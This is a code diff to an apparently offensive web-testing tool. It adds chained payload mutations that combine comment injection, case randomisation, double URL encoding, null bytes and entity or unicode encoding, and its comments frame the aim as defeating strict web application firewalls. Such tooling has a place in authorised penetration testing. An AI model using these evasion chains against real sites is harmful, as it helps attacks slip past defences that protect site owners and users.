@@ -384,7 +384,96 @@ class PayloadMutator:
             except Exception:
                 continue
 
+        # Chained mutations: compose 2-3 strategies for strict WAFs
+        # Single mutations often fail against modern WAFs that normalize
+        # and re-check after decoding. Chaining defeats multi-layer parsing.
+        if len(strategies) >= 2:
+            chains = self._build_chains(strategies)
+            for chain_name, chain_fns in chains:
+                if len(mutations) >= max_mutations:
+                    break
+                try:
+                    variant = payload
+                    for fn in chain_fns:
+                        variant = fn(variant)
+                    if variant and variant != payload and variant not in seen:
+                        seen.add(variant)
+                        mutations.append({
+                            "payload": variant,
+                            "mutation": chain_name,
+                            "parent": payload[:60],
+                        })
+                except Exception:
+                    continue
+
         return mutations
+
+    def _build_chains(self, strategies: list) -> list:
+        """Build effective 2-3 mutation chains for strict WAF bypass.
+
+        Not random combos — carefully ordered chains that exploit how
+        WAFs parse in stages: normalize → pattern match → decode → re-check.
+        """
+        chains = []
+        strat_map = {name: fn for name, fn in strategies}
+
+        # Chain 1: comment_injection + case_randomize
+        # Breaks pattern matching AND case-sensitive rules
+        if "comment_injection" in strat_map and "case_randomize" in strat_map:
+            chains.append((
+                "comment+case",
+                [strat_map["comment_injection"], strat_map["case_randomize"]],
+            ))
+
+        # Chain 2: comment_injection + double_url_encode
+        # Comment breaks pattern, double-encode survives URL normalization
+        if "comment_injection" in strat_map and "double_url_encode" in strat_map:
+            chains.append((
+                "comment+dblenc",
+                [strat_map["comment_injection"], strat_map["double_url_encode"]],
+            ))
+
+        # Chain 3: case_randomize + null_byte_insert
+        # Mixed case + null byte — defeats both case normalization and pattern matching
+        if "case_randomize" in strat_map and "null_byte_insert" in strat_map:
+            chains.append((
+                "case+null",
+                [strat_map["case_randomize"], strat_map["null_byte_insert"]],
+            ))
+
+        # Chain 4: html_entity_encode + comment_injection
+        # Entity-encode critical chars, then break remaining patterns with comments
+        if "html_entity_encode" in strat_map and "comment_injection" in strat_map:
+            chains.append((
+                "entity+comment",
+                [strat_map["html_entity_encode"], strat_map["comment_injection"]],
+            ))
+
+        # Chain 5: triple — case + comment + double_url_encode
+        # Full evasion stack for strictest WAFs
+        if all(s in strat_map for s in ("case_randomize", "comment_injection", "double_url_encode")):
+            chains.append((
+                "case+comment+dblenc",
+                [strat_map["case_randomize"], strat_map["comment_injection"],
+                 strat_map["double_url_encode"]],
+            ))
+
+        # Chain 6: unicode_escape + comment_injection
+        if "unicode_escape" in strat_map and "comment_injection" in strat_map:
+            chains.append((
+                "unicode+comment",
+                [strat_map["unicode_escape"], strat_map["comment_injection"]],
+            ))
+
+        # Chain 7: tag_substitute + case_randomize + null_byte
+        if all(s in strat_map for s in ("tag_substitute", "case_randomize", "null_byte_insert")):
+            chains.append((
+                "tagsub+case+null",
+                [strat_map["tag_substitute"], strat_map["case_randomize"],
+                 strat_map["null_byte_insert"]],
+            ))
+
+        return chains
 
     def _pick_strategies(self) -> list:
         """Select mutation strategies based on what the WAF does/doesn't block."""
